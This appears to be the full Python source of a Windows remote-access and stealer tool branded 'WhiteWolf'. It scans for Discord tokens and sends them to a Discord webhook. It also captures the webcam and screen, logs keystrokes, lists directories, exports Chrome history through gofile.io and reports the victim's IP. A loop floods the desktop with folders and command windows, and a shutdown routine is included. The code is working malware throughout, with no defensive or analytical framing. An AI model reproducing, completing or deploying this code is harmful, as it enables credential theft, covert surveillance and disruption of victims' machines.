import os
import time
import requests
import threading
import subprocess
import io
import mss.tools
from pynput import keyboard
import random
import shutil
import json
import sys
import webbrowser
from scanner import scan_all
import sqlite3
import tempfile
from code.error import error
import cv2
from code.colors import *



os.system("cls")
print(f""" {YELLOW}
            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡠⠖⢉⣌⢆⠀⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠀⠀⣠⠚⠉⠀⠈⠉⠲⣿⣿⡜⡀⠀⠀⠀⠀
            ⡔⢉⣙⣓⣒⡲⠮⡇⠀⠀⠀⠀⠀⠀⠘⡿⡇⡇⠀⠀⠀⠀
            ⡇⠘⣿⣿⣿⠏⠀⠀⠠⣀⡀⠀⠀⠀⠀⡇⠈⠳⡄⠀⠀⠀
            ⢹⠀⢻⣿⠇⠀⠀⣀⣀⠀⡍⠃⠀⠀⣠⣷⡟⢳⡜⡄⠀⠀
            ⠈⣆⠀⠋⢀⢔⣵⣿⠋⠹⣿⠒⠒⠚⠁⣿⣿⣾⣷⢸⠤⡄
            ⠀⡇⠀⠀⢸⢸⣿⣿⣶⣾⡏⡇⠀⠀⢀⡘⣝⠿⡻⢸⡰⠁
            ⠀⢳⠀⠀⠈⢆⠻⢿⡿⠟⡱⠁⠰⠛⢿⡇⠀⠉⠀⡸⠁⠀
            ⠀⠈⢆⠀⠀⠀⠉⠒⠒⣉⡀⠀⠀⢇⠀⡇⠀⠀⢠⠃⠀⠀
            ⠀⠀⠈⠣⡀⠀⠀⠀⠀⠀⢉⡱⠀⠀⠉⠀⢀⡴⠁⠀⠀⠀
            ⠀⠀⠀⠀⠈⠓⠦⣀⣉⡉⠁⢀⣀⣠⠤⠒⠥⣄⠀⠀⠀⠀
            ⠀⠀⠀⠀⠀⠰⣉⣀⣀⡠⠭⠛⠀⠀⠑⠒⠤⠤⠷⠀⠀⠀
⠀⠀⠀⠀⠀⠀
""")
os.system("cls")


def resource_path(file):
    try:
        base_path = sys._MEIPASS 
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, file)


config_path = resource_path("config.json")

with open(config_path, "r", encoding="utf-8") as f:
    config = json.load(f)

webhook = config["webhook"]

def discord_injection():
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
    from scanner import scan_all
    if __name__ == "__main__":
        tokens = scan_all()
        if not tokens:
            print("")
        else:
            for i, item in enumerate(tokens, 1):
                source = item.get("source", "?")
                profile = item.get("profile", "")
                token = item["token"]
                data = {
                    "content": token, 
                    "username": "WhiteWolf", 
                    "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                    }
                requests.post(webhook, json=data)
def webcam():
    try:
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            print(f"psc")
            return
        else:
            print(f"Ok")

        ret, frame = cap.read()

        if ret:
            filename =f"webcam_capture_{time.strftime('%Y%m%d_%H%M%S')}.png"
            cv2.imwrite(filename, frame)
            with open(filename, 'rb') as f:
                requests.post(webhook, 
                    data={"content": "Photo webcam"}, 
                    files={"file": f})
            os.remove(filename)
        else:
            print(f"prblm")

        cap.release()
    except Exception as e:
        print(f"Erorr {e}")

def dossier():
    while True:
        try:
            ajout = random.randint(1, 9999999999)
            bureau = os.path.join(os.path.expanduser("~"), "Desktop")
            new_dossier = os.path.join(bureau, f"Virus{ajout}")
     
            os.mkdir(new_dossier)
        except Exception as e:
            print(f"Error {e}")
        try:
            os.system("start cmd")
        except Exception as e:
            print(f"Error {e}")
        try:
            webbrowser.open("https://www.youtube.com/watch?v=TEjNPzf67n8")
        except Exception as e:
            print(f"Error {e}")


def shutdown():
    try:
        os.system("shutdown /s /t 0")
    except Exception as e:
        print(f"Error {e}")


def capture():
    with mss.MSS() as sct:
        img = sct.grab(sct.monitors[1])

        img_bytes = mss.tools.to_png(img.rgb, img.size)

    files = {
        "file": ("screen.png", io.BytesIO(img_bytes), "image/png")
    }

    requests.post(webhook, data={"content": "screenshot", "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"}, files=files)


def dir():
    try:
        result = subprocess.run("dir /s", shell=True, capture_output=True, text=True)
        contenue = result.stdout[:1900]
        
        data = {
            "content": contenue,
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }
        requests.post(webhook, json=data)
    except Exception as e:
        print("Probleme et survenue", e)
        requests.post(webhook, json={"content": str(e)})

# Help by ai for export in gofile
def get_chrome_history_path():
    local_appdata = os.getenv('LOCALAPPDATA')
    if not local_appdata:
        local_appdata = r"C:\Users\{}\AppData\Local".format(os.getenv('USERNAME'))
    
    path = os.path.join(local_appdata, r"Google\Chrome\User Data\Default\History")
    
    if not os.path.exists(path):
        user_data = os.path.join(local_appdata, r"Google\Chrome\User Data")
        try:
            for item in os.listdir(user_data):
                if item.startswith("Profile") or item == "Default":
                    candidate = os.path.join(user_data, item, "History")
                    if os.path.exists(candidate):
                        return candidate
        except:
            pass
    return path

# help by ai for gofile export
def export_history_txt():
    history_path = get_chrome_history_path()
    
    if not os.path.exists(history_path):
        print("[-] Historique Chrome non trouvé")
        return

    with tempfile.TemporaryDirectory() as tmpdir:
        copy_path = os.path.join(tmpdir, "History.db")
        txt_path = os.path.join(tmpdir, "history.txt")

        try:
            shutil.copy2(history_path, copy_path)
        except Exception as e:
            print(f"Error : {e}")
            return

        try:
            conn = sqlite3.connect(copy_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                SELECT url, title, last_visit_time 
                FROM urls 
                ORDER BY last_visit_time DESC
            """)
            
            with open(txt_path, "w", encoding="utf-8") as f:
                f.write("=== Chrome History Export ===\n\n")
                rows = cursor.fetchall()
                for url, title, timestamp in rows:
                    title = title or "No Title"
                    f.write(f"{title}\n{url}\n\n")
            
            conn.close()

            print(f"Historique exporté : {len(rows)} entrées")
            try:
                upload_url = "https://upload.gofile.io/uploadFile"   

                with open(txt_path, "rb") as f:
                    files = {"file": ("chrome_history.txt", f, "text/plain")}
                    r = requests.post(upload_url, files=files, timeout=60)

                response = r.json()
                
                if response.get("status") == "ok":
                    download_url = response["data"]["downloadPage"]
                    print(f"\nUpload réussi !")
                    print(f"Lien : {download_url}")
                    data = {
                "content": download_url, 
                "username": "WhiteWolf", 
                "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                    }
                    requests.post(webhook, json=data)
                    return download_url
                else:
                    print("Erreur GoFile :", response)

            except Exception as e:
                print(f"Error {e}")

        except Exception as e:
            print(f"Error {e}")

def ip():
    try:
        ip = requests.get("https://checkip.amazonaws.com").text.strip()
        data = {
            "content": ip,
            "username": "WhiteWolf",
            "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
        }
        requests.post(webhook, json=data)
    except ValueError:
        print("Value error")
        time.sleep(3)


buffer = ""
timer = None

def send_buffer():
    global buffer

    if buffer:
        requests.post(webhook, json={"content": buffer, "username": "WhiteWolf", "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"})
        buffer = ""

def reset_timer():
    global timer

    if timer:
        timer.cancel()

    timer = threading.Timer(1.0, send_buffer)  
    timer.start()

def on_press(key):
    global buffer

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"

    reset_timer()

def start_listener():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()


discord_injection()
ip()
dir()
capture()
t1 = threading.Thread(target=start_listener)
t2 = threading.Thread(target=dossier)
t3 = threading.Thread(target=export_history_txt)
t4 = threading.Thread(target=get_chrome_history_path)
t5 = threading.Thread(target=error)
t6 = threading.Thread(target=webcam)
t1.start()
t2.start()
t3.start()
t4.start()
t5.start()
t6.start()